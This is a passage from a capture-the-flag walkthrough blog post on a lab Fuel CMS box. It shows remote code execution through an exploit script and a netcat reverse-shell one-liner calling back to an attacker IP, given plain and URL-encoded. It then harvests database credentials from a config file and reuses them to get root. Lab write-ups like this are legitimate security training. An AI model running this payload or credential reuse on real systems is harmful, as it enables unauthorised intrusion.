<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-csharp" data-lang="csharp"><span style="color:#960050;background-color:#1e0010">┌──</span>(root<span style="color:#960050;background-color:#1e0010">💀</span>b0x)-[/mnt/hgfs/THM/Ignite]
<span style="color:#960050;background-color:#1e0010">└─#</span> ruby <span style="color:#ae81ff">49487.</span>rb http:<span style="color:#75715e">//10.10.140.200 &#34;id&#34;
</span><span style="color:#75715e"></span>uid=<span style="color:#ae81ff">33</span>(www-data) gid=<span style="color:#ae81ff">33</span>(www-data) groups=<span style="color:#ae81ff">33</span>(www-data)
</code></pre></div><p>Oh wow, we got rce! Let&rsquo;s use nc to get reverse shell to our own box.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-csharp" data-lang="csharp"><span style="color:#960050;background-color:#1e0010">┌──</span>(root<span style="color:#960050;background-color:#1e0010">💀</span>b0x)-[/mnt/hgfs/THM/Ignite]
<span style="color:#960050;background-color:#1e0010">└─#</span> ruby <span style="color:#ae81ff">49487.</span>rb http:<span style="color:#75715e">//10.10.140.200 &#34;which%20nc&#34;                                                                                                                                                            1 ⨯
</span><span style="color:#75715e"></span>/bin/nc
</code></pre></div><h2 id="exploitation">Exploitation</h2>
<p>Can URL encode our payload in <a href="https://gchq.github.io/CyberChef/#recipe=URL_Encode(true)&amp;input=cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL2Jhc2ggLWkgMj4mMXxuYyAxMC4xNy4wLjEyMCA1NTU1ID4vdG1wL2Y">CyberChef</a>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-csharp" data-lang="csharp">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i <span style="color:#ae81ff">2</span>&gt;&amp;<span style="color:#ae81ff">1</span>|nc <span style="color:#ae81ff">10.17</span>.<span style="color:#ae81ff">0.120</span> <span style="color:#ae81ff">5555</span> &gt;/tmp/f

rm%<span style="color:#ae81ff">20</span>%<span style="color:#ae81ff">2F</span>tmp%<span style="color:#ae81ff">2F</span>f%<span style="color:#ae81ff">3</span>Bmkfifo%<span style="color:#ae81ff">20</span>%<span style="color:#ae81ff">2F</span>tmp%<span style="color:#ae81ff">2F</span>f%<span style="color:#ae81ff">3</span>Bcat%<span style="color:#ae81ff">20</span>%<span style="color:#ae81ff">2F</span>tmp%<span style="color:#ae81ff">2F</span>f%<span style="color:#ae81ff">7</span>C%<span style="color:#ae81ff">2F</span>bin%<span style="color:#ae81ff">2F</span>bash%<span style="color:#ae81ff">20</span>%<span style="color:#ae81ff">2D</span>i%<span style="color:#ae81ff">202</span>%<span style="color:#ae81ff">3</span>E%<span style="color:#ae81ff">261</span>%<span style="color:#ae81ff">7</span>Cnc%<span style="color:#ae81ff">2010</span>%<span style="color:#ae81ff">2</span>E17%<span style="color:#ae81ff">2</span>E0%<span style="color:#ae81ff">2</span>E120%<span style="color:#ae81ff">205555</span>%<span style="color:#ae81ff">20</span>%<span style="color:#ae81ff">3</span>E%<span style="color:#ae81ff">2F</span>tmp%<span style="color:#ae81ff">2F</span>f
</code></pre></div><p>Got reverse shell!</p>
<p><img src="/img/ignite-thm/Untitled%204.png" alt=""></p>
<p>Let&rsquo;s look for flag in <code>/var/www/</code> and in <code>/home/</code> directory.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-csharp" data-lang="csharp">www-data@ubuntu:/<span style="color:#66d9ef">var</span>/www/html<span style="color:#960050;background-color:#1e0010">$</span> ls -la 
total <span style="color:#ae81ff">52</span>
drwxrwxrwx <span style="color:#ae81ff">4</span> root root  <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2019</span> .
drwxr-xr-x <span style="color:#ae81ff">3</span> root root  <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2019</span> ..
-rw-r--r-- <span style="color:#ae81ff">1</span> root root   <span style="color:#ae81ff">163</span> Jul <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2019</span> .htaccess
-rwxrwxrwx <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">1427</span> Jul <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2019</span> README.md
drwxrwxrwx <span style="color:#ae81ff">9</span> root root  <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2019</span> assets
-rwxrwxrwx <span style="color:#ae81ff">1</span> root root   <span style="color:#ae81ff">193</span> Jul <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2019</span> composer.json
-rwxrwxrwx <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">6502</span> Jul <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2019</span> contributing.md
drwxrwxrwx <span style="color:#ae81ff">9</span> root root  <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2019</span> fuel
-rwxrwxrwx <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">11802</span> Jul <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2019</span> index.php
-rwxrwxrwx <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">30</span> Jul <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2019</span> robots.txt
www-data@ubuntu:/<span style="color:#66d9ef">var</span>/www/html<span style="color:#960050;background-color:#1e0010">$</span> cd ..
www-data@ubuntu:/<span style="color:#66d9ef">var</span>/www<span style="color:#960050;background-color:#1e0010">$</span> ls- la 

^C
www-data@ubuntu:/<span style="color:#66d9ef">var</span>/www<span style="color:#960050;background-color:#1e0010">$</span> ^C
www-data@ubuntu:/<span style="color:#66d9ef">var</span>/www<span style="color:#960050;background-color:#1e0010">$</span> ^C
www-data@ubuntu:/<span style="color:#66d9ef">var</span>/www<span style="color:#960050;background-color:#1e0010">$</span> ls -al 
total <span style="color:#ae81ff">12</span>
drwxr-xr-x  <span style="color:#ae81ff">3</span> root root <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2019</span> .
drwxr-xr-x <span style="color:#ae81ff">15</span> root root <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2019</span> ..
drwxrwxrwx  <span style="color:#ae81ff">4</span> root root <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2019</span> html
www-data@ubuntu:/<span style="color:#66d9ef">var</span>/www<span style="color:#960050;background-color:#1e0010">$</span> 
www-data@ubuntu:/<span style="color:#66d9ef">var</span>/www<span style="color:#960050;background-color:#1e0010">$</span> 
www-data@ubuntu:/<span style="color:#66d9ef">var</span>/www<span style="color:#960050;background-color:#1e0010">$</span> 
www-data@ubuntu:/<span style="color:#66d9ef">var</span>/www<span style="color:#960050;background-color:#1e0010">$</span> cd /home/
www-data@ubuntu:/home<span style="color:#960050;background-color:#1e0010">$</span> ls -al 
total <span style="color:#ae81ff">12</span>
drwxr-xr-x  <span style="color:#ae81ff">3</span> root     root     <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2019</span> .
drwxr-xr-x <span style="color:#ae81ff">24</span> root     root     <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2019</span> ..
drwx--x--x  <span style="color:#ae81ff">2</span> www-data www-data <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2019</span> www-data
www-data@ubuntu:/home<span style="color:#960050;background-color:#1e0010">$</span> find , ^C
www-data@ubuntu:/home<span style="color:#960050;background-color:#1e0010">$</span> find . 
.
./www-data
./www-data/flag.txt
www-data@ubuntu:/home<span style="color:#960050;background-color:#1e0010">$</span> cd www-data/
www-data@ubuntu:/home/www-data<span style="color:#960050;background-color:#1e0010">$</span> ls -al 
total <span style="color:#ae81ff">12</span>
drwx--x--x <span style="color:#ae81ff">2</span> www-data www-data <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2019</span> .
drwxr-xr-x <span style="color:#ae81ff">3</span> root     root     <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2019</span> ..
-rw-r--r-- <span style="color:#ae81ff">1</span> root     root       <span style="color:#ae81ff">34</span> Jul <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2019</span> flag.txt
www-data@ubuntu:/home/www-data<span style="color:#960050;background-color:#1e0010">$</span> cat flag.txt 
<span style="color:#ae81ff">64.</span>......................b 
www-data@ubuntu:/home/www-data<span style="color:#960050;background-color:#1e0010">$</span>
</code></pre></div><p>Cool, now time for privesc!</p>
<h2 id="privileges-escalation">Privileges Escalation</h2>
<p>The first thing, after getting a shell is to enumerate local credentials, of DB, .htpasswd, whatever, just grab em all!</p>
<p>After googling, found out that <code>Fuel CMS</code> keeps it&rsquo;s DB configuration files in <code>../fuel/application/config/database.php</code></p>
<p><img src="/img/ignite-thm/Untitled%205.png" alt=""></p>
<p>We can check the contents of the file:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#a6e22e">www</span><span style="color:#f92672">-</span><span style="color:#a6e22e">data</span><span style="color:#f92672">@</span><span style="color:#a6e22e">ubuntu</span><span style="color:#f92672">:/</span><span style="color:#66d9ef">var</span><span style="color:#f92672">/</span><span style="color:#a6e22e">www</span><span style="color:#f92672">/</span><span style="color:#a6e22e">html</span><span style="color:#f92672">/</span><span style="color:#a6e22e">fuel</span><span style="color:#960050;background-color:#1e0010">$</span> <span style="color:#a6e22e">cat</span> <span style="color:#a6e22e">application</span><span style="color:#f92672">/</span><span style="color:#a6e22e">config</span><span style="color:#f92672">/</span><span style="color:#a6e22e">database</span><span style="color:#f92672">.</span><span style="color:#a6e22e">php</span>    
<span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>                                                                                                    
<span style="color:#a6e22e">defined</span>(<span style="color:#e6db74">&#39;BASEPATH&#39;</span>) <span style="color:#66d9ef">OR</span> <span style="color:#66d9ef">exit</span>(<span style="color:#e6db74">&#39;No direct script access allowed&#39;</span>);                      
                                                                                                                                                                                                                   
<span style="color:#75715e">/*                                                                                                                                                                                                                 
</span><span style="color:#75715e">| -------------------------------------------------------------------                                                                                                                                              
</span><span style="color:#75715e">| DATABASE CONNECTIVITY SETTINGS
</span><span style="color:#75715e">| -------------------------------------------------------------------     
</span><span style="color:#75715e">| This file will contain the settings needed to access your database.
</span><span style="color:#75715e">|                                                                                                        
</span><span style="color:#75715e">| For complete instructions please consult the &#39;Database Connection&#39;                                 
</span><span style="color:#75715e">| page of the User Guide.                                                                                
</span><span style="color:#75715e">|                                                                                                        
</span><span style="color:#75715e">| -------------------------------------------------------------------                  
</span><span style="color:#75715e">| EXPLANATION OF VARIABLES                                                                               
</span><span style="color:#75715e">| -------------------------------------------------------------------                         
</span><span style="color:#75715e">|                                                                                                        
</span><span style="color:#75715e">|       [&#39;dsn&#39;]      The full DSN string describe a connection to the database.                 
</span><span style="color:#75715e">|       [&#39;hostname&#39;] The hostname of your database server.                                  
</span><span style="color:#75715e">|       [&#39;username&#39;] The username used to connect to the database
</span><span style="color:#75715e">|       [&#39;password&#39;] The password used to connect to the database     
</span><span style="color:#75715e">|       [&#39;database&#39;] The name of the database you want to connect to     
</span><span style="color:#75715e">|       [&#39;dbdriver&#39;] The database driver. e.g.: mysqli.
</span><span style="color:#75715e">|                       Currently supported:                                                             
</span><span style="color:#75715e">|                                cubrid, ibase, mssql, mysql, mysqli, oci8,
</span><span style="color:#75715e">|                                odbc, pdo, postgre, sqlite, sqlite3, sqlsrv
</span><span style="color:#75715e">|       [&#39;dbprefix&#39;] You can add an optional prefix, which will be added
</span><span style="color:#75715e">|                                to the table name when using the  Query Builder class
</span><span style="color:#75715e">|       [&#39;pconnect&#39;] TRUE/FALSE - Whether to use a persistent connection
</span><span style="color:#75715e">|       [&#39;db_debug&#39;] TRUE/FALSE - Whether database errors should be displayed.
</span><span style="color:#75715e">|       [&#39;cache_on&#39;] TRUE/FALSE - Enables/disables query caching
</span><span style="color:#75715e">|       [&#39;cachedir&#39;] The path to the folder where cache files should be stored
</span><span style="color:#75715e">|       [&#39;char_set&#39;] The character set used in communicating with the database
</span><span style="color:#75715e">|       [&#39;dbcollat&#39;] The character collation used in communicating with the database
</span><span style="color:#75715e">|                                NOTE: For MySQL and MySQLi databases, this setting is only used
</span><span style="color:#75715e">|                                as a backup if your server is running PHP &lt; 5.2.3 or MySQL &lt; 5.0.7
</span><span style="color:#75715e">|                                (and in table creation queries made with DB Forge).
</span><span style="color:#75715e">|                                There is an incompatibility in PHP with mysql_real_escape_string() which                                                                                                          
</span><span style="color:#75715e">|                                can make your site vulnerable to SQL injection if you are using a                                                                                                                 
</span><span style="color:#75715e">|                                multi-byte character set and are running versions lower than these.                                                                                                               
</span><span style="color:#75715e">|                                Sites using Latin-1 or UTF-8 database character set and collation are unaffected.                                                                                                 
</span><span style="color:#75715e">|       [&#39;swap_pre&#39;] A default table prefix that should be swapped with the dbprefix                                                                                                                               
</span><span style="color:#75715e">|       [&#39;encrypt&#39;]  Whether or not to use an encrypted connection.                                                                                                                                                
</span><span style="color:#75715e">|                        
</span><span style="color:#75715e">|                       &#39;mysql&#39; (deprecated), &#39;sqlsrv&#39; and &#39;pdo/sqlsrv&#39; drivers accept TRUE/FALSE                                                                                                                  
</span><span style="color:#75715e">|                       &#39;mysqli&#39; and &#39;pdo/mysql&#39; drivers accept an array with the following options:                                                                                                               
</span><span style="color:#75715e">|                           
</span><span style="color:#75715e">|                               &#39;ssl_key&#39;    - Path to the private key file
</span><span style="color:#75715e">|                               &#39;ssl_cert&#39;   - Path to the public key certificate file                   
</span><span style="color:#75715e">|                               &#39;ssl_ca&#39;     - Path to the certificate authority file
</span><span style="color:#75715e">|                               &#39;ssl_capath&#39; - Path to a directory containing trusted CA certificats in PEM format                                                                                                 
</span><span style="color:#75715e">|                               &#39;ssl_cipher&#39; - List of *allowed* ciphers to be used for the encryption, separated by colons (&#39;:&#39;)                                                                                  
</span><span style="color:#75715e">|                               &#39;ssl_verify&#39; - TRUE/FALSE; Whether verify the server certificate or not (&#39;mysqli&#39; only)                                                                                            
</span><span style="color:#75715e">|                               
</span><span style="color:#75715e">|       [&#39;compress&#39;] Whether or not to use client compression (MySQL only)
</span><span style="color:#75715e">|       [&#39;stricton&#39;] TRUE/FALSE - forces &#39;Strict Mode&#39; connections   
</span><span style="color:#75715e">|                                                       - good for ensuring strict SQL while developing  
</span><span style="color:#75715e">|       [&#39;ssl_options&#39;] Used to set various SSL options that can be used when making SSL connections.
</span><span style="color:#75715e">|       [&#39;failover&#39;] array - A array with 0 or more data for connections if the main should fail.        
</span><span style="color:#75715e">|       [&#39;save_queries&#39;] TRUE/FALSE - Whether to &#34;save&#34; all executed queries.                            
</span><span style="color:#75715e">|                               NOTE: Disabling this will also effectively disable both
</span><span style="color:#75715e">|                               $this-&gt;db-&gt;last_query() and profiling of DB queries.                     
</span><span style="color:#75715e">|                               When you run a query, with this setting set to TRUE (default),
</span><span style="color:#75715e">|                               CodeIgniter will store the SQL statement for debugging purposes.         
</span><span style="color:#75715e">|                               However, this may cause high memory usage, especially if you run
</span><span style="color:#75715e">|                               a lot of SQL queries ... disable this to avoid that problem.
</span><span style="color:#75715e">|                                                                                                        
</span><span style="color:#75715e">| The $active_group variable lets you choose which connection group to
</span><span style="color:#75715e">| make active.  By default there is only one group (the &#39;default&#39; group).
</span><span style="color:#75715e">|                                                                                                        
</span><span style="color:#75715e">| The $query_builder variables lets you determine whether or not to load                                 
</span><span style="color:#75715e">| the query builder class.                                                                               
</span><span style="color:#75715e">*/</span>                                                                                                       
$active_group <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;default&#39;</span>;                                                                               
$query_builder <span style="color:#f92672">=</span> <span style="color:#66d9ef">TRUE</span>;                                                                                   
                                                                                                         
$db[<span style="color:#e6db74">&#39;default&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(                                                                                  
        <span style="color:#e6db74">&#39;dsn&#39;</span>   <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;&#39;</span>,                                                                                   
        <span style="color:#e6db74">&#39;hostname&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;localhost&#39;</span>,                                                                       
        <span style="color:#e6db74">&#39;username&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;root&#39;</span>,                                                                            
        <span style="color:#e6db74">&#39;password&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;mememe&#39;</span>,                                                                          
        <span style="color:#e6db74">&#39;database&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;fuel_schema&#39;</span>,                                                                     
        <span style="color:#e6db74">&#39;dbdriver&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;mysqli&#39;</span>
<span style="color:#f92672">...</span>
</code></pre></div><p>We do have the DB credentials, <code>root:mememe</code></p>
<p>Let&rsquo;s try using these maybe?</p>
<h2 id="root-shell">Root Shell!</h2>
<p><img src="/img/ignite-thm/Untitled%206.png" alt=""></p>
<p>We&rsquo;re root! Thanks for reading the walkthrough! Hopefully you enjoyed it 😁</p>
<hr>
<h3 id="things-learnt">Things learnt:</h3>
<ul>
<li>Always read the pages of the web application (you might find interesting stuff)</li>
<li>Check /robots.txt by default!</li>
<li>Try all the exploits! <strong>Don&rsquo;t rely on and keep trying only one</strong></li>
<li>Enumerate credentials files (if there&rsquo;s a CMS, definitely there&rsquo;s going to be a configuration file)</li>
</ul>

    </div>
    
      
        <div class="pagination">
          <div class="pagination__title">
            <span class="pagination__title-h">Read other posts</span>
            <hr />
          </div>
          <div class="pagination__buttons">
            
            
              <span class="button next">
                <a href="https://umar0x01.sh/post/bounty-hacker-thm/">
                  <span class="button__text">Bounty Hacker - THM Walkthrough</span>
                  <span class="button__icon">→</span>
                </a>
              </span>
            
          </div>
        </div>
      
    


    
      
        <div id="disqus_thread"></div>
<script type="application/javascript">
    var disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "umar0x01" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
      
    

    
<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
	ga('create', 'UA-177361132-1', 'auto');
	
	ga('send', 'pageview');
}
</script>

    </div>

      </div>

      
        <footer class="footer">
  <div class="footer__inner">
    
      <a href="/" class="logo" style="text-decoration: none;">
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
</svg>
</span>
    <span class="logo__text">$ cd /home/umar_0x01/</span>
    <span class="logo__cursor"></span>
  
</a>

      <div class="copyright">
        <span>© 2021 <a href="https://github.com/Anon-Exploiter" target="_blank" rel="noopener">Umar_0x01</a></span>
        <span> twitter<a href="https://twitter.com/syed__umar" target="_blank" rel="noopener">@syed__umar</a>&nbsp;</span>
        <span> <a href="https://umar0x01.sh/archive" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
      </div>
    
  </div>
</footer>
<script src="https://umar0x01.sh/assets/main.js"></script>
<script src="https://umar0x01.sh/assets/prism.js"></script>








      
    </div>

    
      
<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
	ga('create', 'UA-177361132-1', 'auto');
	
	ga('send', 'pageview');
}
</script>
    
  </body>
</html>
